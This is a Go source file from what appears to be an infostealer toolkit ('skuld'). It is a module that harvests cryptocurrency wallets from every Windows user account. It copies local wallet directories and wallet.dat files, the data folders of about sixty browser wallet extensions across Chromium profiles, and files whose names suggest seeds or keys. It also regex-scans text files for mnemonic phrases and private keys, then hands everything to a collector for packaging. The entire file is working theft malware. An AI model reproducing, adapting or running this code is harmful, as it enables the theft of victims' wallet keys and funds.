package wallets

import (
	"fmt"
	"os"
	"path/filepath"
	"regexp"
	"strings"

	"github.com/hackirby/skuld/modules/browsers"
	"github.com/hackirby/skuld/utils/fileutil"
	"github.com/hackirby/skuld/utils/hardware"
	"github.com/hackirby/skuld/utils/collector"
)

func Run(dataCollector *collector.DataCollector) {
	// Run all wallet collection functions
	LocalWallets(dataCollector)
	WalletExtensions(dataCollector)
	WalletFiles(dataCollector)
	CryptoFiles(dataCollector)
}

func LocalWallets(dataCollector *collector.DataCollector) {
	users := hardware.GetUsers()
	tempDir := filepath.Join(os.TempDir(), "local-wallets-temp")
	os.MkdirAll(tempDir, os.ModePerm)
	defer os.RemoveAll(tempDir)
	
	found := ""
	totalFiles := 0
	
	// Enhanced wallet paths with more locations
	walletPaths := map[string][]string{
		"Zcash": {
			"\\Zcash",
			"\\AppData\\Roaming\\Zcash",
		},
		"Armory": {
			"\\Armory",
			"\\AppData\\Roaming\\Armory",
		},
		"Bytecoin": {
			"\\bytecoin",
			"\\AppData\\Roaming\\bytecoin",
		},
		"Jaxx": {
			"\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb",
			"\\AppData\\Roaming\\com.liberty.jaxx",
		},
		"Exodus": {
			"\\Exodus\\exodus.wallet",
			"\\Exodus",
			"\\AppData\\Roaming\\Exodus",
			"\\AppData\\Local\\Exodus",
		},
		"Ethereum": {
			"\\Ethereum\\keystore",
			"\\AppData\\Roaming\\Ethereum",
		},
		"Electrum": {
			"\\Electrum\\wallets",
			"\\Electrum",
			"\\AppData\\Roaming\\Electrum",
		},
		"AtomicWallet": {
			"\\atomic\\Local Storage\\leveldb",
			"\\atomic",
			"\\AppData\\Roaming\\atomic",
		},
		"Guarda": {
			"\\Guarda\\Local Storage\\leveldb",
			"\\Guarda",
			"\\AppData\\Roaming\\Guarda",
		},
		"Coinomi": {
			"\\Coinomi\\Coinomi\\wallets",
			"\\Coinomi",
			"\\AppData\\Local\\Coinomi",
		},
		"Bitcoin": {
			"\\Bitcoin",
			"\\AppData\\Roaming\\Bitcoin",
		},
		"Litecoin": {
			"\\Litecoin",
			"\\AppData\\Roaming\\Litecoin",
		},
		"Dogecoin": {
			"\\Dogecoin",
			"\\AppData\\Roaming\\Dogecoin",
		},
		"Dash": {
			"\\DashCore",
			"\\AppData\\Roaming\\DashCore",
		},
		"Monero": {
			"\\Monero",
			"\\AppData\\Roaming\\Monero",
		},
		"Electroneum": {
			"\\Electroneum",
			"\\AppData\\Roaming\\Electroneum",
		},
		"Raven": {
			"\\Raven",
			"\\AppData\\Roaming\\Raven",
		},
		"Chia": {
			"\\Chia",
			"\\AppData\\Local\\Chia",
		},
	}

	for _, user := range users {
		userName := strings.Split(user, "\\")[2]
		
		for walletName, paths := range walletPaths {
			for _, path := range paths {
				// Try both Roaming and Local paths
				fullPaths := []string{
					filepath.Join(user, "AppData", "Roaming") + path,
					filepath.Join(user, "AppData", "Local") + path,
					user + path,
				}
				
				for _, fullPath := range fullPaths {
					if !fileutil.IsDir(fullPath) && !fileutil.Exists(fullPath) {
						continue
					}

					destPath := filepath.Join(tempDir, userName, walletName)
					os.MkdirAll(destPath, os.ModePerm)

					var err error
					if fileutil.IsDir(fullPath) {
						err = fileutil.CopyDir(fullPath, destPath)
					} else {
						err = fileutil.CopyFile(fullPath, filepath.Join(destPath, filepath.Base(fullPath)))
					}

					if err == nil {
						found += fmt.Sprintf("\n✅ %s - %s", userName, walletName)
						totalFiles++
						break // Found this wallet, move to next
					}
				}
			}
		}

		// Search for wallet.dat files in common locations
		walletDatPaths := []string{
			filepath.Join(user, "AppData", "Roaming", "Bitcoin", "wallet.dat"),
			filepath.Join(user, "AppData", "Roaming", "Litecoin", "wallet.dat"),
			filepath.Join(user, "AppData", "Roaming", "Dogecoin", "wallet.dat"),
			filepath.Join(user, "AppData", "Roaming", "DashCore", "wallet.dat"),
			filepath.Join(user, "AppData", "Roaming", "Electroneum", "wallet.dat"),
			filepath.Join(user, "AppData", "Roaming", "Raven", "wallet.dat"),
			filepath.Join(user, "Desktop", "wallet.dat"),
			filepath.Join(user, "Documents", "wallet.dat"),
			filepath.Join(user, "Downloads", "wallet.dat"),
		}

		for _, walletPath := range walletDatPaths {
			if fileutil.Exists(walletPath) {
				walletDir := filepath.Base(filepath.Dir(walletPath))
				destPath := filepath.Join(tempDir, userName, "WalletDat", walletDir+"_wallet.dat")
				os.MkdirAll(filepath.Dir(destPath), os.ModePerm)
				
				if err := fileutil.CopyFile(walletPath, destPath); err == nil {
					found += fmt.Sprintf("\n✅ %s - %s wallet.dat", userName, walletDir)
					totalFiles++
				}
			}
		}
	}

	if found != "" {
		walletsInfo := map[string]interface{}{
			"LocalWalletsFound": found,
			"TotalFiles":        totalFiles,
			"TreeView":          fileutil.Tree(tempDir, ""),
		}
		dataCollector.AddData("local_wallets", walletsInfo)
		dataCollector.AddDirectory("local_wallets", tempDir, "local_wallets_data")
	}
}

func WalletExtensions(dataCollector *collector.DataCollector) {
	// Enhanced wallet extensions list
	walletExtensions := map[string]string{
		"Authenticator":     "\\Local Extension Settings\\bhghoamapcdpbohphigoooaddinpkbai",
		"Binance":           "\\Local Extension Settings\\fhbohimaelbohpjbbldcngcnapndodjp",
		"Bitapp":            "\\Local Extension Settings\\fihkakfobkmkjojpchpfgcmhfjnmnfpi",
		"BoltX":             "\\Local Extension Settings\\aodkkagnadcbobfpggfnjeongemjbjca",
		"Coin98":            "\\Local Extension Settings\\aeachknmefphepccionboohckonoeemg",
		"Coinbase":          "\\Local Extension Settings\\hnfanknocfeofbddgcijnmhnfnkdnaad",
		"Core":              "\\Local Extension Settings\\agoakfejjabomempkjlepdflaleeobhb",
		"Crocobit":          "\\Local Extension Settings\\pnlfjmlcjdjgkddecgincndfgegkecke",
		"Equal":             "\\Local Extension Settings\\blnieiiffboillknjnepogjhkgnoapac",
		"Ever":              "\\Local Extension Settings\\cgeeodpfagjceefieflmdfphplkenlfk",
		"ExodusWeb3":        "\\Local Extension Settings\\aholpfdialjgjfhomihkjbmgjidlcdno",
		"Fewcha":            "\\Local Extension Settings\\ebfidpplhabeedpnhjnobghokpiioolj",
		"Finnie":            "\\Local Extension Settings\\cjmkndjhnagcfbpiemnkdpomccnjblmj",
		"Guarda":            "\\Local Extension Settings\\hpglfhgfnhbgpjdenjgmdgoeiappafln",
		"Guild":             "\\Local Extension Settings\\nanjmdknhkinifnkgdcggcfnhdaammmj",
		"HarmonyOutdated":   "\\Local Extension Settings\\fnnegphlobjdpkhecapkijjdkgcjhkib",
		"Iconex":            "\\Local Extension Settings\\flpiciilemghbmfalicajoolhkkenfel",
		"Jaxx Liberty":      "\\Local Extension Settings\\cjelfplplebdjjenllpjcblmjkfcffne",
		"Kaikas":            "\\Local Extension Settings\\jblndlipeogpafnldhgmapagcccfchpi",
		"KardiaChain":       "\\Local Extension Settings\\pdadjkfkgcafgbceimcpbkalnfnepbnk",
		"Keplr":             "\\Local Extension Settings\\dmkamcknogkgcdfhhbddcghachkejeap",
		"Liquality":         "\\Local Extension Settings\\kpfopkelmapcoipemfendmdcghnegimn",
		"MEWCX":             "\\Local Extension Settings\\nlbmnnijcnlegkjjpcfjclmcfggfefdm",
		"MaiarDEFI":         "\\Local Extension Settings\\dngmlblcodfobpdpecaadgfbcggfjfnm",
		"Martian":           "\\Local Extension Settings\\efbglgofoippbgcjepnhiblaibcnclgk",
		"Math":              "\\Local Extension Settings\\afbcbjpbpfadlkmhmclhkeeodmamcflc",
		"Metamask":          "\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn",
		"Metamask2":         "\\Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm",
		"Mobox":             "\\Local Extension Settings\\fcckkdbjnoikooededlapcalpionmalo",
		"Nami":              "\\Local Extension Settings\\lpfcbjknijpeeillifnkikgncikgfhdo",
		"Nifty":             "\\Local Extension Settings\\jbdaocneiiinmjbjlgalhcelgbejmnid",
		"Oxygen":            "\\Local Extension Settings\\fhilaheimglignddkjgofkcbgekhenbh",
		"PaliWallet":        "\\Local Extension Settings\\mgffkfbidihjpoaomajlbgchddlicgpn",
		"Petra":             "\\Local Extension Settings\\ejjladinnckdgjemekebdpeokbikhfci",
		"Phantom":           "\\Local Extension Settings\\bfnaelmomeimhlpmgjnjophhpkkoljpa",
		"Pontem":            "\\Local Extension Settings\\phkbamefinggmakgklpkljjmgibohnba",
		"Ronin":             "\\Local Extension Settings\\fnjhmkhhmkbjkkabndcnnogagogbneec",
		"Safepal":           "\\Local Extension Settings\\lgmpcpglpngdoalbgeoldeajfclnhafa",
		"Saturn":            "\\Local Extension Settings\\nkddgncdjgjfcddamfgcmfnlhccnimig",
		"Slope":             "\\Local Extension Settings\\pocmplpaccanhmnllbbkpgfliimjljgo",
		"Solfare":           "\\Local Extension Settings\\bhhhlbepdkbapadjdnnojkbgioiodbic",
		"Sollet":            "\\Local Extension Settings\\fhmfendgdocmcbmfikdcogofphimnkno",
		"Starcoin":          "\\Local Extension Settings\\mfhbebgoclkghebffdldpobeajmbecfk",
		"Swash":             "\\Local Extension Settings\\cmndjbecilbocjfkibfbifhngkdmjgog",
		"TempleTezos":       "\\Local Extension Settings\\ookjlbkiijinhpmnjffcofjonbfbgaoc",
		"TerraStation":      "\\Local Extension Settings\\aiifbnbfobpmeekipheeijimdpnlpgpp",
		"Tokenpocket":       "\\Local Extension Settings\\mfgccjchihfkkindfppnaooecgfneiii",
		"Ton":               "\\Local Extension Settings\\nphplpgoakhhjchkkhmiggakijnkhfnd",
		"Tron":              "\\Local Extension Settings\\ibnejdfjmmkpcnlpebklmnkoeoihofec",
		"Trust Wallet":      "\\Local Extension Settings\\egjidjbpglichdcondbcbdnbeeppgdph",
		"Wombat":            "\\Local Extension Settings\\amkmjjmmflddogmhpjloimipbofnfjih",
		"XDEFI":             "\\Local Extension Settings\\hmeobnfnfcmdkdcmlblgagmfpfboieaf",
		"XMR.PT":            "\\Local Extension Settings\\eigblbgjknlfbajkfhopmcojidlgcehm",
		"XinPay":            "\\Local Extension Settings\\bocpokimicclpaiekenaeelehdjllofo",
		"Yoroi":             "\\Local Extension Settings\\ffnbelfdoeiohenkjibnmadjiehjhajb",
		"iWallet":           "\\Local Extension Settings\\kncchdigobghenbbaddojjnnaogfppfj",
		// Additional popular wallets
		"TrustWallet":       "\\Local Extension Settings\\egjidjbpglichdcondbcbdnbeeppgdph",
		"CoinbaseWallet":    "\\Local Extension Settings\\hnfanknocfeofbddgcijnmhnfnkdnaad",
		"BinanceChain":      "\\Local Extension Settings\\fhbohimaelbohpjbbldcngcnapndodjp",
		"WalletConnect":     "\\Local Extension Settings\\jnlgamecbpmbajjfhmmmlhejkemejdma",
	}

	users := hardware.GetUsers()
	browsersPath := browsers.GetChromiumBrowsers()
	var profilesPaths []browsers.Profile
	
	for _, user := range users {
		for name, path := range browsersPath {
			path = filepath.Join(user, path)
			if !fileutil.IsDir(path) {
				continue
			}

			browser := browsers.Browser{
				Name: name,
				Path: path,
				User: strings.Split(user, "\\")[2],
			}

			if browser.Name == "Opera" || browser.Name == "OperaGX" {
				profilesPaths = append(profilesPaths, browsers.Profile{
					Name:    "Default",
					Path:    browser.Path,
					Browser: browser,
				})
				continue
			}

			profiles, err := os.ReadDir(path)
			if err != nil {
				continue
			}
			for _, profile := range profiles {
				if profile.IsDir() {
					profilePath := filepath.Join(path, profile.Name())
					if fileutil.Exists(filepath.Join(profilePath, "Web Data")) {
						profilesPaths = append(profilesPaths, browsers.Profile{
							Name:    profile.Name(),
							Path:    profilePath,
							Browser: browser,
						})
					}
				}
			}
		}
	}

	if len(profilesPaths) == 0 {
		return
	}

	tempDir := filepath.Join(os.TempDir(), "wallet-extensions-temp")
	os.MkdirAll(tempDir, os.ModePerm)
	defer os.RemoveAll(tempDir)
	
	found := ""
	totalExtensions := 0

	for _, profile := range profilesPaths {
		for name, path := range walletExtensions {
			fullPath := filepath.Join(profile.Path, path)
			if !fileutil.IsDir(fullPath) {
				continue
			}

			destPath := filepath.Join(tempDir, profile.Browser.User, profile.Browser.Name, profile.Name, name)
			os.MkdirAll(filepath.Dir(destPath), os.ModePerm)

			err := fileutil.CopyDir(fullPath, destPath)
			if err != nil {
				continue
			}
			found += fmt.Sprintf("\n✅ %s - %s - %s", profile.Browser.User, profile.Browser.Name, name)
			totalExtensions++
		}
	}

	if found != "" {
		extensionsInfo := map[string]interface{}{
			"WalletExtensionsFound": found,
			"TotalExtensions":       totalExtensions,
			"TreeView":              fileutil.Tree(tempDir, ""),
		}
		dataCollector.AddData("wallet_extensions", extensionsInfo)
		dataCollector.AddDirectory("wallet_extensions", tempDir, "wallet_extensions_data")
	}
}

func WalletFiles(dataCollector *collector.DataCollector) {
	users := hardware.GetUsers()
	tempDir := filepath.Join(os.TempDir(), "wallet-files-temp")
	os.MkdirAll(tempDir, os.ModePerm)
	defer os.RemoveAll(tempDir)

	found := ""
	totalFiles := 0
	
	// Enhanced wallet keywords
	walletKeywords := []string{
		"wallet", "seed", "mnemonic", "private", "key", "phrase", 
		"bitcoin", "ethereum", "crypto", "recovery", "backup",
		"metamask", "exodus", "atomic", "electrum", "jaxx",
		"coinbase", "binance", "trust", "phantom", "solana",
		"polygon", "bsc", "bnb", "ada", "cardano", "dot",
		"polkadot", "avax", "avalanche", "matic", "ftm",
		"fantom", "one", "harmony", "near", "algo",
		"algorand", "xtz", "tezos", "atom", "cosmos",
		"luna", "terra", "sol", "btc", "eth", "ltc",
		"bch", "xmr", "monero", "dash", "zcash", "doge",
		"dogecoin", "shib", "shiba", "usdt", "usdc",
		"dai", "busd", "tusd", "pax", "gusd", "husd",
	}

	for _, user := range users {
		userName := strings.Split(user, "\\")[2]
		userDirs := []string{
			filepath.Join(user, "Desktop"),
			filepath.Join(user, "Documents"),
			filepath.Join(user, "Downloads"),
			filepath.Join(user, "Pictures"),
			filepath.Join(user, "Videos"),
			filepath.Join(user, "Music"),
			filepath.Join(user, "OneDrive"),
		}

		for _, dir := range userDirs {
			if !fileutil.IsDir(dir) {
				continue
			}

			filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
				if err != nil || info.IsDir() {
					return nil
				}

				// Skip large files
				if info.Size() > 50*1024*1024 { // 50MB
					return nil
				}

				fileName := strings.ToLower(info.Name())
				
				// Check for wallet-related keywords
				isWalletFile := false
				for _, keyword := range walletKeywords {
					if strings.Contains(fileName, keyword) {
						isWalletFile = true
						break
					}
				}

				// Check for specific wallet file extensions
				ext := strings.ToLower(filepath.Ext(fileName))
				walletExts := []string{".dat", ".wallet", ".json", ".txt", ".key", ".pem", ".p12", ".keystore", ".aes", ".backup"}
				
				if isWalletFile {
					for _, walletExt := range walletExts {
						if ext == walletExt || ext == "" {
							destPath := filepath.Join(tempDir, userName, "WalletFiles", info.Name())
							os.MkdirAll(filepath.Dir(destPath), os.ModePerm)
							
							if err := fileutil.CopyFile(path, destPath); err == nil {
								found += fmt.Sprintf("\n✅ %s - %s", userName, info.Name())
								totalFiles++
							}
							break
						}
					}
				}

				return nil
			})
		}
	}

	if found != "" {
		walletFilesInfo := map[string]interface{}{
			"WalletFilesFound": found,
			"TotalFiles":       totalFiles,
			"TreeView":         fileutil.Tree(tempDir, ""),
		}
		dataCollector.AddData("wallet_files", walletFilesInfo)
		dataCollector.AddDirectory("wallet_files", tempDir, "wallet_files_data")
	}
}

func CryptoFiles(dataCollector *collector.DataCollector) {
	users := hardware.GetUsers()
	tempDir := filepath.Join(os.TempDir(), "crypto-files-temp")
	os.MkdirAll(tempDir, os.ModePerm)
	defer os.RemoveAll(tempDir)

	// Enhanced regex patterns for crypto detection
	patterns := map[string]*regexp.Regexp{
		"mnemonic_12":           regexp.MustCompile(`(?i)\b([a-z]+\s+){11}[a-z]+\b`),
		"mnemonic_24":           regexp.MustCompile(`(?i)\b([a-z]+\s+){23}[a-z]+\b`),
		"bitcoin_private_key":   regexp.MustCompile(`[5KL][1-9A-HJ-NP-Za-km-z]{50,51}`),
		"ethereum_private_key":  regexp.MustCompile(`0x[a-fA-F0-9]{64}`),
		"bitcoin_address":       regexp.MustCompile(`[13][a-km-zA-HJ-NP-Z1-9]{25,34}|bc1[a-z0-9]{39,59}`),
		"ethereum_address":      regexp.MustCompile(`0x[a-fA-F0-9]{40}`),
		"litecoin_address":      regexp.MustCompile(`[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}`),
		"dogecoin_address":      regexp.MustCompile(`D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}`),
		"monero_address":        regexp.MustCompile(`4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}`),
		"dash_address":          regexp.MustCompile(`X[1-9A-HJ-NP-Za-km-z]{33}`),
		"zcash_address":         regexp.MustCompile(`t1[a-zA-Z0-9]{33}`),
		"ripple_address":        regexp.MustCompile(`r[0-9a-zA-Z]{24,34}`),
		"stellar_address":       regexp.MustCompile(`G[A-Z2-7]{55}`),
		"cardano_address":       regexp.MustCompile(`addr1[a-z0-9]+`),
		"tron_address":          regexp.MustCompile(`T[A-Za-z1-9]{33}`),
		"binance_address":       regexp.MustCompile(`bnb1[a-z0-9]{38}`),
		"solana_address":        regexp.MustCompile(`[1-9A-HJ-NP-Za-km-z]{32,44}`),
	}

	found := 0
	suspiciousFiles := make(map[string][]string)

	for _, user := range users {
		userName := strings.Split(user, "\\")[2]
		userDirs := []string{
			filepath.Join(user, "Desktop"),
			filepath.Join(user, "Documents"),
			filepath.Join(user, "Downloads"),
			filepath.Join(user, "Pictures"),
			filepath.Join(user, "Videos"),
			filepath.Join(user, "Music"),
			filepath.Join(user, "OneDrive"),
		}

		for _, dir := range userDirs {
			if !fileutil.IsDir(dir) {
				continue
			}

			filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
				if err != nil || info.IsDir() {
					return nil
				}

				// Only check text files
				ext := strings.ToLower(filepath.Ext(info.Name()))
				textExts := []string{".txt", ".json", ".csv", ".log", ".md", ".rtf", ".dat", ".key", ".pem"}
				isTextFile := false
				for _, textExt := range textExts {
					if ext == textExt {
						isTextFile = true
						break
					}
				}

				if !isTextFile || info.Size() > 5*1024*1024 { // 5MB limit for text files
					return nil
				}

				content, err := fileutil.ReadFile(path)
				if err != nil {
					return nil
				}

				matches := make([]string, 0)
				for patternName, pattern := range patterns {
					if pattern.MatchString(content) {
						matches = append(matches, patternName)
					}
				}

				if len(matches) > 0 {
					destPath := filepath.Join(tempDir, userName, "CryptoFiles", info.Name())
					os.MkdirAll(filepath.Dir(destPath), os.ModePerm)
					
					if err := fileutil.CopyFile(path, destPath); err == nil {
						suspiciousFiles[info.Name()] = matches
						found++
					}
				}

				return nil
			})
		}
	}

	if found > 0 {
		// Create detailed analysis file
		summaryPath := filepath.Join(tempDir, "CRYPTO_ANALYSIS.txt")
		summaryContent := "🔍 CRYPTO FILES ANALYSIS\n"
		summaryContent += "========================\n\n"
		summaryContent += fmt.Sprintf("Total suspicious files found: %d\n\n", found)
		
		for fileName, matches := range suspiciousFiles {
			summaryContent += fmt.Sprintf("📄 File: %s\n", fileName)
			summaryContent += fmt.Sprintf("🎯 Matches: %s\n", strings.Join(matches, ", "))
			summaryContent += "---\n\n"
		}
		fileutil.AppendFile(summaryPath, summaryContent)

		cryptoInfo := map[string]interface{}{
			"CryptoFilesFound":  found,
			"SuspiciousFiles":   suspiciousFiles,
			"TreeView":          fileutil.Tree(tempDir, ""),
		}
		dataCollector.AddData("crypto_files", cryptoInfo)
		dataCollector.AddDirectory("crypto_files", tempDir, "crypto_files_data")
	}
}